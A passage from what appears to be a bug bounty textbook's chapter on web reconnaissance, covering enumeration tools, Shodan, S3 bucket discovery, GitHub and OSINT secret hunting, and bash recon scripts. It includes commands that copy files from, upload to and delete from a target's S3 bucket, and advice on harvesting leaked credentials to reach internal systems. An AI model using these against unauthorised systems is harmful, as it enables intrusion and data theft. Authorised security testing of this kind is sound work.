output to the terminal. The\n-u option tells sort to return only unique items in the sorted list.\nGobuster is a tool for brute-forcing to discover subdomains, directories,\nand files on target web servers. Its DNS mode is used for subdomain brute-\nforcing. In this mode, you can use the flag -d to specify the domain you\nwant to brute-force and -w to specify the wordlist you want to use:\ngobuster dns -d target_domain -w wordlist\nOnce you’ve found a good number of subdomains, you can discover more\nby identifying patterns. For example, if you find two subdomains of example\n.com named 1.example.com and 3.example.com, you can guess that 2.example.com\nis probably also a valid subdomain. A good tool for automating this process is\nAltdns (https://github.com/infosec-au/altdns/), which discovers subdomains with\nnames that are permutations of other subdomain names.\nIn addition, you can find more subdomains based on your knowledge\nabout the company’s technology stack. For example, if you’ve already\nlearned that example.com uses Jenkins, you can check if jenkins.example.com is\na valid subdomain.\nAlso look for subdomains of subdomains. After you’ve found, say, dev.example\n.com, you might find subdomains like 1.dev.example.com. You can find subdomains\nof subdomains by running enumeration tools recursively: add the results of your\nfirst run to your Known Domains list and run the tool again.\nService Enumeration\nNext, enumerate the services hosted on the machines you’ve found. Since ser-\nvices often run on default ports, a good way to find them is by port-scanning\nthe machine with either active or passive scanning.\nIn active scanning, you directly engage with the server. Active scan-\nning tools send requests to connect to the target machine’s ports to look\nfor open ones. You can use tools like Nmap or Masscan for active scanning.\nFor example, this simple Nmap command reveals the open ports on scanme\n.nmap.org:\n$ nmap scanme.nmap.org\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.086s latency).\nOther addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f\nNot shown: 993 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n80/tcp open http\n135/tcp filtered msrpc\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo\n31337/tcp open Elite\nNmap done: 1 IP address (1 host up) scanned in 230.83 seconds\nWeb Hacking Reconnaissance 69\nOn the other hand, in passive scanning, you use third-party resources to\nlearn about a machine’s ports without interacting with the server. Passive\nscanning is stealthier and helps attackers avoid detection. To find services\non a machine without actively scanning it, you can use Shodan, a search\nengine that lets the user find machines connected to the internet.\nWith Shodan, you can discover the presence of webcams, web servers,\nor even power plants based on criteria such as hostnames or IP addresses.\nFor example, if you run a Shodan search on scanme.nmap.org’s IP address,\n45.33.32.156, you get the result in Figure 5-1. You can see that the search\nyields different data than our port scan, and provides additional informa-\ntion about the server.\nFigure 5-1: The Shodan results page of scanme .nmap .org\nAlternatives to Shodan include Censys and Project Sonar. Combine the\ninformation you gather from different databases for the best results. With\nthese databases, you might also find your target’s IP addresses, certificates,\nand software versions.\nDirectory Brute-Forcing\nThe next thing you can do to discover more of the site’s attack surface is\nbrute-force the directories of the web servers you’ve found. Finding direc-\ntories on servers is valuable, because through them, you might discover\nhidden admin panels, configuration files, password files, outdated function-\nalities, database copies, and source code files. Directory brute-forcing can\nsometimes allow you to directly take over a server!\nEven if you can’t find any immediate exploits, directory information\noften tells you about the structure and technology of an application. For\nexample, a pathname that includes phpmyadmin usually means that the\napplication is built with PHP.\nYou can use Dirsearch or Gobuster for directory brute-forcing. These\ntools use wordlists to construct URLs, and then request these URLs from\na web server. If the server responds with a status code in the 200 range, the\ndirectory or file exists. This means you can browse to the page and see what\n70 Chapter 5\nthe application is hosting there. A status code of 404 means that the directory\nor file doesn’t exist, while 403 means it exists but is protected. Examine 403\npages carefully to see if you can bypass the protection to access the content.\nHere’s an example of running a Dirsearch command. The -u flag speci-\nfies the hostname, and the -e flag specifies the file extension to use when\nconstructing URLs:\n$ ./dirsearch.py -u scanme.nmap.org -e php\nExtensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6023\nError Log: /tools/dirsearch/logs/errors.log\nTarget: scanme.nmap.org\n[12:31:11] Starting:\n[12:31:13] 403 - 290B - /.htusers\n[12:31:15] 301 - 316B - /.svn -> http://scanme.nmap.org/.svn/\n[12:31:15] 403 - 287B - /.svn/\n[12:31:15] 403 - 298B - /.svn/all-wcprops\n[12:31:15] 403 - 294B - /.svn/entries\n[12:31:15] 403 - 297B - /.svn/prop-base/\n[12:31:15] 403 - 296B - /.svn/pristine/\n[12:31:15] 403 - 291B - /.svn/tmp/\n[12:31:15] 403 - 315B - /.svn/text-base/index.php.svn-base\n[12:31:15] 403 - 293B - /.svn/props/\n[12:31:15] 403 - 297B - /.svn/text-base/\n[12:31:40] 301 - 318B - /images -> http://scanme.nmap.org/images/\n[12:31:40] 200 - 7KB - /index\n[12:31:40] 200 - 7KB - /index.html\n[12:31:53] 403 - 295B - /server-status\n[12:31:53] 403 - 296B - /server-status/\n[12:31:54] 301 - 318B - /shared -> http://scanme.nmap.org/shared/\nTask Completed\nGobuster’s Dir mode is used to find additional content on a specific\ndomain or subdomain. This includes hidden directories and files. In this\nmode, you can use the -u flag to specify the domain or subdomain you want\nto brute-force and -w to specify the wordlist you want to use:\ngobuster dir -u target_url -w wordlist\nManually visiting all the pages you’ve found through brute-forcing can be\ntime-consuming. Instead, use a screenshot tool like EyeWitness (https://github\n.com/FortyNorthSecurity/EyeWitness/) or Snapper (https://github.com/dxa4481/\nSnapper/) to automatically verify that a page is hosted on each location.\nEyeWitness accepts a list of URLs and takes screenshots of each page. In a\nphoto gallery app, you can quickly skim these to find the interesting-looking\nones. Keep an eye out for hidden services, such as developer or admin panels,\ndirectory listing pages, analytics pages, and pages that look outdated and ill-\nmaintained. These are all common places for vulnerabilities to manifest.\nSpidering the Site\nAnother way of discovering directories and paths is through web spidering, or\nweb crawling, a process used to identify all pages on a site. A web spider tool\nWeb Hacking Reconnaissance 71\nstarts with a page to visit. It then identifies all the URLs embedded on the\npage and visits them. By recursively visiting all URLs found on all pages of a\nsite, the web spider can uncover many hidden endpoints in an application.\nOWASP Zed Attack Proxy (ZAP) at https://www.zaproxy.org/ has a built-in\nweb spider you can use (Figure 5-2). This open source security tool includes\na scanner, proxy, and many other features. Burp Suite has an equivalent\ntool called the crawler, but I prefer ZAP’s spider.\nFigure 5-2: The startup page of OWASP ZAP\nAccess its spider tool by opening ZAP and choosing ToolsSpider\n(Figure 5-3).\nFigure 5-3: You can find the Spider tool via ToolsSpider.\n72 Chapter 5\nYou should see a window for specifying the starting URL (Figure 5-4).\nFigure 5-4: You can specify the target URL to scan.\nClick Start Scan. You should see URLs pop up in the bottom window\n(Figure 5-5).\nFigure 5-5: The scan results show up at the bottom pane of the OWASP ZAP window.\nYou should also see a site tree appear on the left side of your ZAP\nwindow (Figure 5-6). This shows you the files and directories found on the\ntarget server in an organized format.\nFigure 5-6: The site tree in the left window shows you the files and directories found on\nthe target server.\nWeb Hacking Reconnaissance 73\nThird-Party Hosting\nTake a look at the company’s third-party hosting footprint. For example,\nlook for the organization’s S3 buckets. S3, which stands for Simple Storage\nService, is Amazon’s online storage product. Organizations can pay to store\nresources in buckets to serve in their web applications, or they can use S3\nbuckets as a backup or storage location. If an organization uses Amazon S3,\nits S3 buckets can contain hidden endpoints, logs, credentials, user infor-\nmation, source code, and other information that might be useful to you.\nHow do you find an organization’s buckets? One way is through Google\ndorking, as mentioned earlier. Most buckets use the URL format BUCKET\n.s3.amazonaws.com or s3.amazonaws.com/BUCKET, so the following search\nterms are likely to find results:\nsite:s3.amazonaws.com COMPANY_NAME\nsite:amazonaws.com COMPANY_NAME\nIf the company uses custom URLs for its S3 buckets, try more flexible\nsearch terms instead. Companies often still place keywords like aws and s3\nin their custom bucket URLs, so try these searches:\namazonaws s3 COMPANY_NAME\namazonaws bucket COMPANY_NAME\namazonaws COMPANY_NAME\ns3 COMPANY_NAME\nAnother way of finding buckets is to search a company’s public GitHub\nrepositories for S3 URLs. Try searching these repositories for the term s3. We’ll\ntalk about using GitHub for recon in “GitHub Recon” on the following page.\nGrayhatWarfare (https://buckets.grayhatwarfare.com/) is an online search\nengine you can use to find publicly exposed S3 buckets (Figure 5-7). It allows\nyou to search for a bucket by using a keyword. Supply keywords related to\nyour target, such as the application, project, or organization name, to find\nrelevant buckets.\nFigure 5-7: The GrayhatWarfare home page\nFinally, you can try to brute-force buckets by using keywords. Lazys3\n(https://github.com/nahamsec/lazys3/) is a tool that helps you do this. It\nrelies on a wordlist to guess buckets that are permutations of common\n74 Chapter 5\nbucket names. Another good tool is Bucket Stream (https://github.com/eth0izzle/\nbucket-stream/), which parses certificates belonging to an organization and\nfinds S3 buckets based on permutations of the domain names found on the\ncertificates. Bucket Stream also automatically checks whether the bucket is\naccessible, so it saves you time.\nOnce you’ve found a couple of buckets that belong to the target organi-\nzation, use the AWS command line tool to see if you can access one. Install\nthe tool by using the following command:\npip install awscli\nThen configure it to work with AWS by following Amazon’s documenta-\ntion at https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.\nNow you should be able to access buckets directly from your terminal via\nthe aws s3 command. Try listing the contents of the bucket you found:\naws s3 ls s3://BUCKET_NAME/\nIf this works, see if you can read the contents of any interesting files by\ncopying files to your local machine:\naws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory\nGather any useful information leaked via the bucket and use it for future\nexploitation! If the organization reveals information such as active API keys\nor personal information, you should report this right away. Exposed S3 buck-\nets alone are often considered a vulnerability. You can also try to upload new\nfiles to the bucket or delete files from it. If you can mess with its contents,\nyou might be able to tamper with the web application’s operations or corrupt\ncompany data. For example, this command will copy your local file named\nTEST_FILE into the target’s S3 bucket:\naws s3 cp TEST_FILE s3://BUCKET_NAME/\nAnd this command will remove the TEST_FILE that you just uploaded:\naws s3 rm s3://BUCKET_NAME/TEST_FILE\nThese commands are a harmless way to prove that you have write access\nto a bucket without actually tampering with the target company’s files.\nAlways upload and remove your own test files. Don’t risk deleting\nimportant company resources during your testing unless you’re willing to\nentertain a costly lawsuit.\nGitHub Recon\nSearch an organization’s GitHub repositories for sensitive data that has\nbeen accidentally committed, or information that could lead to the discov-\nery of a vulnerability.\nStart by finding the GitHub usernames relevant to your target. You\nshould be able to locate these by searching the organization’s name or\nWeb Hacking Reconnaissance 75\nproduct names via GitHub’s search bar, or by checking the GitHub\naccounts of known employees.\nWhen you’ve found usernames to audit, visit their pages. Find reposito-\nries related to the projects you’re testing and record them, along with the\nusernames of the organization’s top contributors, which can help you find\nmore relevant repositories.\nThen dive into the code. For each repository, pay special attention to\nthe Issues and Commits sections. These sections are full of potential info\nleaks: they could point attackers to unresolved bugs, problematic code, and\nthe most recent code fixes and security patches. Recent code changes that\nhaven’t stood the test of time are more likely to contain bugs. Look at any\nprotection mechanisms implemented to see if you can bypass them. You can\nalso search the Code section for potentially vulnerable code snippets. Once\nyou’ve found a file of interest, check the Blame and History sections at the\ntop-right corner of the file’s page to see how it was developed (Figure 5-8).\nFigure 5-8: The History and Blame sections\nWe’ll dive deeper into reviewing source code in Chapter 22, but during\nthe recon phase, look for hardcoded secrets such as API keys, encryption keys,\nand database passwords. Search the organization’s repositories for terms like\nkey, secret, and password to locate hardcoded user credentials that you can\nuse to access internal systems. After you’ve found leaked credentials, you can use\nKeyHacks (https://github.com/streaak/keyhacks/) to check if the credentials are\nvalid and learn how to use them to access the target’s services.\nYou should also search for sensitive functionalities in the project. See\nif any of the source code deals with important functions such as authen-\ntication, password reset, state-changing actions, or private info reads. Pay\nattention to code that deals with user input, such as HTTP request param-\neters, HTTP headers, HTTP request paths, database entries, file reads, and\nfile uploads, because they provide potential entry points for attackers to\nexploit the application’s vulnerabilities. Look for any configuration files, as\nthey allow you to gather more information about your infrastructure. Also,\nsearch for old endpoints and S3 bucket URLs that you can attack. Record\nthese files for further review in the future.\nOutdated dependencies and the unchecked use of dangerous functions\nare also a huge source of bugs. Pay attention to dependencies and imports\nbeing used and go through the versions list to see if they’re outdated.\nRecord any outdated dependencies. You can use this information later to\nlook for publicly disclosed vulnerabilities that would work on your target.\n76 Chapter 5\nTools like Gitrob and TruffleHog can automate the GitHub recon pro-\ncess. Gitrob (https://github.com/michenriksen/gitrob/) locates potentially sensitive\nfiles pushed to public repositories on GitHub. TruffleHog (https://github.com/\ntrufflesecurity/truffleHog/) specializes in finding secrets in repositories by con-\nducting regex searches and scanning for high-entropy strings.\nOther Sneaky OSINT Techniques\nMany of the strategies I discussed so far are all examples of open source intel-\nligence (OSINT), or the practice of gathering intel from public sources of\ninformation. This section details other OSINT sources you might use to\nextract valuable information.\nFirst, check the company’s job posts for engineering positions.\nEngineering job listings often reveal the technologies the company uses.\nFor example, take a look at an ad like this one:\nFull Stack Engineer\nMinimum Qualifications:\nProficiency in Python and C/C++\nLinux experience\nExperience with Flask, Django, and Node.js\nExperience with Amazon Web Services, especially EC2, ECS, S3, and RDS\nFrom reading this, you know the company uses Flask, Django, and\nNode.js to build its web applications. The engineers also probably use\nPython, C, and C++ on the backend with a Linux machine. Finally, they\nuse AWS to outsource their operations and file storage.\nIf you can’t find relevant job posts, search for employees’ profiles on\nLinkedIn, and read employees’ personal blogs or their engineering ques-\ntions on forums like Stack Overflow and Quora. The expertise of a com-\npany’s top employees often reflects the technology used in development.\nAnother source of information is the employees’ Google calendars.\nPeople’s work calendars often contain meeting notes, slides, and some-\ntimes even login credentials. If an employee shares their calendars with\nthe public by accident, you could gain access to these. The organization\nor its employees’ social media pages might also leak valuable information.\nFor example, hackers have actually discovered sets of valid credentials on\nPost-it Notes visible in the background of office selfies!\nIf the company has an engineering mailing list, sign up for it to gain\ninsight into the company’s technology and development process. Also check\nthe company’s SlideShare or Pastebin accounts. Sometimes, when organiza-\ntions present at conferences or have internal meetings, they upload slides to\nSlideShare for reference. You might be able to find information about the\ntechnology stack and security challenges faced by the company.\nPastebin (https://pastebin.com/) is a website for pasting and storing text\nonline for a short time. People use it to share text across machines or with\nothers. Engineers sometimes use it to share source code or server logs with\ntheir colleagues for viewing or collaboration, so it could be a great source of\nWeb Hacking Reconnaissance 77\ninformation. You might also find uploaded credentials and development com-\nments. Go to Pastebin, search for the target’s organization name, and see what\nhappens! You can also use automated tools like PasteHunter (https://github.com/\nkevthehermit/PasteHunter/) to scan for publicly pasted data.\nLastly, consult archive websites like the Wayback Machine (https://\narchive.org/web/), a digital record of internet content (Figure 5-9). It records\na site’s content at various points in time. Using the Wayback Machine, you\ncan find old endpoints, directory listings, forgotten subdomains, URLs,\nand files that are outdated but still in use. Tomnomnom’s tool Waybackurls\n(https://github.com/tomnomnom/waybackurls/) can automatically extract end-\npoints and URLs from the Wayback Machine.\nFigure 5-9: The Wayback Machine archives the internet and allows you to see pages that have been\nremoved by a website.\nTech Stack Fingerprinting\nFingerprinting techniques can help you understand the target application\neven better. Fingerprinting is identifying the software brands and versions\nthat a machine or an application uses. This information allows you to per-\nform targeted attacks on the application, because you can search for any\nknown misconfigurations and publicly disclosed vulnerabilities related to a\nparticular version. For example, if you know the server is using an old ver-\nsion of Apache that could be impacted by a disclosed vulnerability, you can\nimmediately attempt to attack the server using it.\nThe security community classifies known vulnerabilities as Common\nVulnerabilities and Exposures (CVEs) and gives each CVE a number for refer-\nence. Search for them on the CVE database (https://cve.mitre.org/cve/search\n_cve_list.html).\nThe simplest way of fingerprinting an application is to engage with the\napplication directly. First, run Nmap on a machine with the -sV flag on to\nenable version detection on the port scan. Here, you can see that Nmap\nattempted to fingerprint some software running on the target host for us:\n$ nmap scanme.nmap.org -sV\nStarting Nmap 7.60 ( https://nmap.org )\nNmap scan report for scanme.nmap.org (45.33.32.156)\n78 Chapter 5\nHost is up (0.065s latency).\nOther addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f\nNot shown: 992 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n25/tcp filtered smtp\n80/tcp open http Apache httpd 2.4.7 ((Ubuntu))\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo Nping echo\n31337/tcp open tcpwrapped\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nService detection performed. Please report any incorrect results at https://nmap.org/submit/.\nNmap done: 1 IP address (1 host up) scanned in 9.19 seconds\nNext, in Burp, send an HTTP request to the server to check the HTTP\nheaders used to gain insight into the tech stack. A server might leak many\npieces of information useful for fingerprinting its technology:\nServer: Apache/2.0.6 (Ubuntu)\nX-Powered-By: PHP/5.0.1\nX-Generator: Drupal 8\nX-Drupal-Dynamic-Cache: UNCACHEABLE\nSet-Cookie: PHPSESSID=abcde;\nHTTP headers like Server and X-Powered-By are good indicators of tech-\nnologies. The Server header often reveals the software versions running\non the server. X-Powered-By reveals the server or scripting language used.\nAlso, certain headers are used only by specific technologies. For example,\nonly Drupal uses X-Generator and X-Drupal-Dynamic-Cache. Technology-specific\ncookies such as PHPSESSID are also clues; if a server sends back a cookie named\nPHPSESSID, it’s probably developed using PHP.\nThe HTML source code of web pages can also provide clues. Many web\nframeworks or other technologies will embed a signature in source code.\nRight-click a page, select View Source Code, and press CTRL-F to search\nfor phrases like powered by, built with, and running. For instance, you might\nfind Powered by: WordPress 3.3.2 written in the source.\nCheck technology-specific file extensions, filenames, folders, and direc-\ntories. For example, a file named phpmyadmin at the root directory, like\nhttps://example.com/phpmyadmin, means the application runs PHP. A directory\nnamed jinja2 that contains templates means the site probably uses Django\nand Jinja2. You can find more information about a specific technology’s file-\nsystem signatures by visiting its individual documentation.\nSeveral applications can automate this process. Wappalyzer (https://www\n.wappalyzer.com/) is a browser extension that identifies content management\nsystems, frameworks, and programming languages used on a site. BuiltWith\n(https://builtwith.com/) is a website that shows you which web technologies\na site is built with. StackShare (https://stackshare.io/) is an online platform\nthat allows developers to share the tech they use. You can use it to find\nout if the organization’s developers have posted their tech stack. Finally,\nWeb Hacking Reconnaissance 79\nRetire.js is a tool that detects outdated JavaScript libraries and Node.js pack-\nages. You can use it to check for outdated technologies on a site.\nWriting Your Own Recon Scripts\nYou’ve probably realized by now that good recon is an extensive process.\nBut it doesn’t have to be time-consuming or hard to manage. We’ve already\ndiscussed several tools that use the power of automation to make the pro-\ncess easier.\nSometimes you may find it handy to write your own scripts. A script is\na list of commands designed to be executed by a program. They’re used\nto automate tasks such as data analysis, web-page generation, and system\nadministration. For us bug bounty hunters, scripting is a way of quickly\nand efficiently performing recon, testing, and exploitation. For example,\nyou could write a script to scan a target for new subdomains, or enumerate\npotentially sensitive files and directories on a server. Once you’ve learned\nhow to script, the possibilities are endless.\nThis section covers bash scripts in particular—what they are and why you\nshould use them. You’ll learn how to use bash to simplify your recon process\nand even write your own tools. I’ll assume that you have basic knowledge of\nhow programming languages work, including variables, conditionals, loops,\nand functions, so if you’re not familiar with these concepts, please take an\nintroduction to coding class at Codecademy (https://www.codecademy.com/) or\nread a programming book.\nBash scripts, or any type of shell script, are useful for managing com-\nplexities and automating recurrent tasks. If your commands involve multiple\ninput parameters, or if the input of one command depends on the output of\nanother, entering it all manually could get complicated quickly and increase\nthe chance of a programming mistake. On the other hand, you might have a\nlist of commands that you want to execute many, many times. Scripts are use-\nful here, as they save you the trouble of typing the same commands over and\nover again. Just run the script each time and be done with it.\nUnderstanding Bash Scripting Basics\nLet’s write our first script. Open any text editor to follow along. The first\nline of every shell script you write should be the shebang line. It starts with\na hash mark (#) and an exclamation mark (!), and it declares the inter-\npreter to use for the script. This allows the plaintext file to be executed like\na binary. We’ll use it to indicate that we’re using bash.\nLet’s say we want to write a script that executes two commands; it should\nrun Nmap and then Dirsearch on a target. We can put the commands in\nthe script like this:\n#!/bin/bash\nnmap scanme.nmap.org\n/PATH/TO/dirsearch.py -u scanme.nmap.org -e php\n80 Chapter 5\nThis script isn’t very useful; it can scan only one site, scanme.nmap.org.\nInstead, we should let users provide input arguments to the bash script so\nthey can choose the site to scan. In bash syntax, $1 represents the first\nargument passed in, $2 is the second argument, and so on. Also, $@ repre-\nsents all arguments passed in, while $# represents the total number of argu-\nments. Let’s allow users to specify their targets with the first input argument,\nassigned to the variable $1:\n#!/bin/bash\nnmap $1\n/PATH/TO/dirsearch.py -u $1 -e php\nNow the commands will execute for whatever domain the user passes in\nas the first argument.\nNotice that the third line of the script includes /PATH/TO/dirsearch.py.\nYou should replace /PATH/TO/ with the absolute path of the directory where\nyou stored the Dirsearch script. If you don’t specify its location, your com-\nputer will try to look for it in the current directory, and unless you stored the\nDirsearch file in the same directory as your shell script, bash won’t find it.\nAnother way of making sure that your script can find the commands to\nuse is through the PATH variable, an environmental variable in Unix systems\nthat specifies where executable binaries are found. If you run this com-\nmand to add Dirsearch’s directory to your PATH, you can run the tool from\nanywhere without needing to specify its absolute path:\nexport PATH=\"PATH_TO_DIRSEARCH:$PATH\"\nAfter executing this command, you should be able to use Dirsearch directly:\n#!/bin/bash\nnmap $1\ndirsearch.py -u $1 -e php\nNote that you will have to run the export command again after you\nrestart your terminal for your PATH to contain the path to Dirsearch. If you\ndon’t want to export PATH over and over again, you can add the export com-\nmand to your ~/.bash_profile file, a file that stores your bash preferences and\nconfiguration. You can do this by opening ~/.bash_profile with your favorite\ntext editor and adding the export command to the bottom of the file.\nThe script is complete! Save it in your current directory with the filename\nrecon.sh. The .sh extension is the conventional extension for shell scripts.\nMake sure your terminal’s working directory is the same as the one where\nyou’ve stored your script by running the command cd /location/of/your/script.\nExecute the script in the terminal with this command:\n$ ./recon.sh\nYou might see a message like this:\npermission denied: ./recon.sh\nWeb Hacking Reconnaissance 81\nThis is because the current user doesn’t have permission to execute the\nscript. For security purposes, most files aren’t executable by default. You\ncan correct this behavior by adding executing rights for everyone by run-\nning this command in the terminal:\n$ chmod +x recon.sh\nThe chmod command edits the permissions for a file, and +x indicates\nthat we want to add the permission to execute for all users. If you’d like to\ngrant executing rights for the owner of the script only, use this command\ninstead:\n$ chmod 700 recon.sh\nNow run the script as we did before. Try passing in scanme.nmap.org as\nthe first argument. You should see the output of the Nmap and Dirsearch\nprinted out:\n$ ./recon.sh scanme.nmap.org\nStarting Nmap 7.60 ( https://nmap.org )\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.062s latency).\nOther addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f\nNot shown: 992 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n80/tcp open http\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo\n31337/tcp open Elite\nNmap done: 1 IP address (1 host up) scanned in 2.16 seconds\nExtensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6023\nError Log: /Users/vickieli/tools/dirsearch/logs/errors.log\nTarget: scanme.nmap.org\n[11:14:30] Starting:\n[11:14:32] 403 - 295B - /.htaccessOLD2\n[11:14:32] 403 - 294B - /.htaccessOLD\n[11:14:33] 301 - 316B - /.svn -> http://scanme.nmap.org/.svn/\n[11:14:33] 403 - 298B - /.svn/all-wcprops\n[11:14:33] 403 - 294B - /.svn/entries\n[11:14:33] 403 - 297B - /.svn/prop-base/\n[11:14:33] 403 - 296B - /.svn/pristine/\n[11:14:33] 403 - 315B - /.svn/text-base/index.php.svn-base\n[11:14:33] 403 - 297B - /.svn/text-base/\n[11:14:33] 403 - 293B - /.svn/props/\n[11:14:33] 403 - 291B - /.svn/tmp/\n[11:14:55] 301 - 318B - /images -> http://scanme.nmap.org/images/\n[11:14:56] 200 - 7KB - /index\n[11:14:56] 200 - 7KB - /index.html\n82 Chapter 5\n[11:15:08] 403 - 296B - /server-status/\n[11:15:08] 403 - 295B - /server-status\n[11:15:08] 301 - 318B - /shared -> http://scanme.nmap.org/shared/\nTask Completed\nSaving Tool Output to a File\nTo analyze the recon results later, you may want to save your scripts’ output\nin a separate file. This is where input and output redirection come into\nplay. Input redirection is using the content of a file, or the output of another\nprogram, as the input to your script. Output redirection is redirecting the out-\nput of a program to another location, such as to a file or another program.\nHere are some of the most useful redirection operators:\nPROGRAM > FILENAME Writes the program’s output into the file with that\nname. (It will clear any content from the file first. It will also create the\nfile if the file does not already exist.)\nPROGRAM >> FILENAME Appends the output of the program to the end of\nthe file, without clearing the file’s original content.\nPROGRAM < FILENAME Reads from the file and uses its content as the pro-\ngram input.\nPROGRAM1 | PROGRAM2 Uses the output of PROGRAM1 as the input to PROGRAM2.\nWe could, for example, write the results of the Nmap and Dirsearch\nscans into different files:\n#!/bin/bash\necho \"Creating directory $1_recon.\" 1\nmkdir $1_recon 2\nnmap $1 > $1_recon/nmap 3\necho \"The results of nmap scan are stored in $1_recon/nmap.\"\n/PATH/TO/dirsearch.py -u $1 -e php 4 --simple-report=$1_recon/dirsearch\necho \"The results of dirsearch scan are stored in $1_recon/dirsearch.\"\nThe echo command 1 prints a message to the terminal. Next, mkdir\ncreates a directory with the name DOMAIN_recon 2. We store the results of\nnmap into a file named nmap in the newly created directory 3. Dirsearch’s\nsimple-report flag 4 generates a report in the designated location. We store\nthe results of Dirsearch to a file named dirsearch in the new directory.\nYou can make your script more manageable by introducing variables to\nreference files, names, and values. Variables in bash can be assigned using\nthe following syntax: VARIABLE_NAME=VARIABLE_VALUE. Note that there should\nbe no spaces around the equal sign. The syntax for referencing variables is\n$VARIABLE_NAME. Let’s implement these into the script:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon 1\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\nWeb Hacking Reconnaissance 83\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php –simple-report=$DIRECTORY/dirsearch 2\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\nWe use ${DOMAIN}_recon instead of $DOMAIN_recon 1 because, otherwise,\nbash would recognize the entirety of DOMAIN_recon as the variable name.\nThe curly brackets tell bash that DOMAIN is the variable name, and _recon is\nthe plaintext we’re appending to it. Notice that we also stored the path to\nDirsearch in a variable to make it easy to change in the future 2.\nUsing redirection, you can now write shell scripts that run many tools\nin a single command and save their outputs in separate files.\nAdding the Date of the Scan to the Output\nLet’s say you want to add the current date to your script’s output, or select\nwhich scans to run, instead of always running both Nmap and Dirsearch.\nIf you want to write tools with more functionalities like this, you have to\nunderstand some advanced shell scripting concepts.\nFor example, a useful one is command substitution, or operating on the\noutput of a command. Using $() tells Unix to execute the command sur-\nrounded by the parentheses and assign its output to the value of a variable.\nLet’s practice using this syntax:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nTODAY=$(date) 1\necho \"This scan was created on $TODAY\" 2\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\nAt 1, we assign the output of the date command to the variable TODAY.\nThe date command displays the current date and time. This lets us output a\nmessage indicating the day on which we performed the scan 2.\nAdding Options to Choose the Tools to Run\nNow, to selectively run only certain tools, you need to use conditionals. In\nbash, the syntax of an if statement is as follows. Note that the conditional\nstatement ends with the fi keyword, which is if backward:\nif [ condition 1 ]\nthen\n# Do if condition 1 is satisfied\nelif [ condition 2 ]\nthen\n84 Chapter 5\n# Do if condition 2 is satisfied, and condition 1 is not satisfied\nelse\n# Do something else if neither condition is satisfied\nfi\nLet’s say that we want users to be able to specify the scan MODE, as such:\n$ ./recon.sh scanmme.nmap.org MODE\nWe can implement this functionality like this:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\"\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\nif [ $2 == \"nmap-only\" ] 1\nthen\nnmap $DOMAIN > $DIRECTORY/nmap 2\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\nelif [ $2 == \"dirsearch-only\" ] 3\nthen\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php –simple-report=$DIRECTORY/dirsearch 4\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\nelse 5\nnmap $DOMAIN > $DIRECTORY/nmap 6\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\nfi\nIf the user specifies nmap-only 1, we run nmap only and store the results\nto a file named nmap 2. If the user specifies dirsearch-only 3, we execute\nand store the results of Dirsearch only 4. If the user specifies neither 5, we\nrun both scans 6.\nNow you can make your tool run only the Nmap or Dirsearch com-\nmands by specifying one of these in the command:\n$ ./recon.sh scanme.nmap.org nmap-only\n$ ./recon.sh scanme.nmap.org dirsearch-only\nRunning Additional Tools\nWhat if you want the option of retrieving information from the crt.sh tool,\nas well? For example, you want to switch between these three modes or run\nall three recon tools at once:\n$ ./recon.sh scanme.nmap.org nmap-only\n$ ./recon.sh scanme.nmap.org dirsearch-only\n$ ./recon.sh scanme.nmap.org crt-only\nWeb Hacking Reconnaissance 85\nWe could rewrite the if-else statements to work with three options: first,\nwe check if MODE is nmap-only. Then we check if MODE is dirsearch-only, and finally\nif MODE is crt-only. But that’s a lot of if-else statements, making the code\ncomplicated.\nInstead, let’s use bash’s case statements, which allow you to match sev-\neral values against one variable without going through a long list of if-else\nstatements. The syntax of case statements looks like this. Note that the state-\nment 